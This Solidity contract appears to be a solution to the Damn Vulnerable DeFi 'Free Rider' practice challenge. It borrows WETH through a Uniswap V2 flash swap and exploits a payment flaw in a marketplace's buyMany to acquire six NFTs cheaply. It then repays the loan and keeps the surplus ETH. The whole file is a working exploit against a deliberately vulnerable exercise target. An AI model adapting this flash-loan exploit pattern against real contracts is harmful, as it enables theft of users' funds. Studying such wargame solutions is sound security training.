// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";


contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver{
    WETH private immutable weth;
    FreeRiderNFTMarketplace private immutable market;
    DamnValuableNFT private immutable nft;
    address private immutable recoveryManager;

    constructor(WETH weth_, FreeRiderNFTMarketplace market_, DamnValuableNFT _nft, address _recoveryManager){
        weth = weth_;
        market = market_;
        nft = _nft;
        recoveryManager = _recoveryManager;
    }
    function attack(IUniswapV2Pair uniswapV2Pair) public payable {
        weth.deposit{value: msg.value}();
        uniswapV2Pair.swap(15 ether, 0, address(this), abi.encode(msg.sender));
    }
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external{
        weth.withdraw(15 ether);
        uint256[] memory ids = new uint256[](6);
        ids[0] = 0;
        ids[1] = 1;
        ids[2] = 2;
        ids[3] = 3;
        ids[4] = 4;
        ids[5] = 5;
        market.buyMany{value: 15 ether}(ids);
        nft.safeTransferFrom(address(this), recoveryManager, 0);
        nft.safeTransferFrom(address(this), recoveryManager, 1);
        nft.safeTransferFrom(address(this), recoveryManager, 2);
        nft.safeTransferFrom(address(this), recoveryManager, 3);
        nft.safeTransferFrom(address(this), recoveryManager, 4);
        nft.safeTransferFrom(address(this), recoveryManager, 5, data);
        uint256 returnAmount = (amount0 * 1000 + 996) / 997;
        weth.deposit{value: returnAmount}();
        weth.transfer(msg.sender, returnAmount);
        address player = abi.decode(data, (address));
        SafeTransferLib.safeTransferETH(player, address (this).balance);
    }
    receive() external payable{}
    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
    external
    override
    returns (bytes4)
    {

        return IERC721Receiver.onERC721Received.selector;
    }
}
